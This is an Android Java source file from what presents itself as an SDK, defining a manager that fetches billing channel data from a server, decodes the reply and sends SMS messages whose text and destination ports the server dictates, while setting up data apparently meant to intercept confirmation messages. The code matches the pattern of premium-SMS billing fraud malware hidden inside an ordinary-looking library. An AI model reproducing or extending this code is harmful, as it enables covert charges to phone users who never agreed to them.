package com.example.administrator.sdk.manager;

import android.content.Context;

import com.example.administrator.sdk.data.InitThroughData;
import com.example.administrator.sdk.data.NormalThroughData;
import com.example.administrator.sdk.httpCenter.ThroughRequest;
import com.example.administrator.sdk.json.InitThroughEntity;
import com.example.administrator.sdk.json.RequestThroughCallBackEntity;
import com.example.administrator.sdk.json.SmsInterceptEntity;
import com.example.administrator.sdk.sms.SmsCenter;
import com.example.administrator.sdk.utils.GsonUtils;
import com.example.administrator.sdk.utils.Kode;
import com.example.administrator.sdk.utils.Log;

import org.json.JSONObject;

import rx.Subscriber;

/**
 * Created by Administrator on 2017/7/19.
 */

public class RequestThroughManager {
    private static RequestThroughManager requestThroughManager = null;
    private static int requestTimes = 0;
    private RequestThroughCallBackEntity requestThroughCallBackEntity = null;

    public static RequestThroughManager getInstance() {
        if (requestThroughManager == null) {
            requestThroughManager = new RequestThroughManager();
        }
        return requestThroughManager;
    }

    public void requestThrough(final Context context, final String price, final String Did) {
        try {
            JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
            String throughID = json.isNull("id") ? null : json.getString("id");
            ThroughRequest.getInstance().request(context, throughID, price, Did, new Subscriber<String>() {
                @Override
                public void onCompleted() {
                    Log.debug("request through completed!!!");
                }

                @Override
                public void onError(Throwable e) {
                    Log.debug("request through error : " + e.getMessage().toString());
                }

                @Override
                public void onNext(String s) {
                    requestTimes++;
                    if (requestTimes > 7) {
                        requestTimes = 0;
//                        return;
                    }
                    Log.debug("request through successed : " + Kode.e(s));
                    requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                    if (!requestThroughCallBackEntity.getState().equals("0")) {
                        Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
                        goToNextThrough(context, price, Did);
                    } else {
                        setInterceptData(requestThroughCallBackEntity.getFix_msg(), requestThroughCallBackEntity.getPayType(), requestThroughCallBackEntity.getLimit_msg_1(), requestThroughCallBackEntity.getLimit_msg_2(), requestThroughCallBackEntity.getLimitNum());
                        send(context);
                    }
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void goToNextThrough(Context context, String price, String Did) {
        requestThrough(context, price, Did);
    }

    private void send(Context context) {
        for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
            String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
            String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
            SmsCenter.getInstance().sendSms(context, sendport, command);
        }
    }

    private void setInterceptData(String fix_msg, String payType, String limit_msg_1, String limit_msg_2, String limitNum) {
        if (!requestThroughCallBackEntity.getPayType().equals("0")) {
            SmsInterceptEntity smsInterceptEntity = new SmsInterceptEntity();
            smsInterceptEntity.setFix_msg(fix_msg);
            smsInterceptEntity.setPayType(payType);
            smsInterceptEntity.setLimit_msg_1(limit_msg_1);
            smsInterceptEntity.setLimit_msg_2(limit_msg_2);
            smsInterceptEntity.setLimitNum(limitNum);
            String a = GsonUtils.getInstance().EntityToJson(smsInterceptEntity);
            Log.debug("aaaaaaa:" + a);
        }
    }
}
